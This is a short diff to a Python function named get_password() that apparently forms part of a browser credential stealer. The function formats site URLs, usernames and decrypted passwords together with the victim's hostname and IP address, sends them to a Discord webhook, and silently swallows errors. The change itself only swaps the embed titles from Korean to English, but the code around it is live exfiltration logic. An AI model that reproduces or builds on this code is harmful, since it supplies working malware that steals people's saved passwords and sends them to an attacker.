@@ -92,9 +92,9 @@ def get_password():
             if username != "" or decrypted_password != "":
                 hack = ("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 10 + "\n")
                 webhook = Webhook.from_url(Webhook_URL, adapter=RequestsWebhookAdapter()) 
-                embed = discord.Embed(title="신상들 어서오고~", description="👋") 
+                embed = discord.Embed(title="Info", description="👋") 
                 embed.add_field(name=hostname, value=IP)
-                embed.add_field(name="계정 신상", value=hack)
+                embed.add_field(name="Account Info", value=hack)
                 webhook.send(embed=embed)
     except Exception as e:
         pass
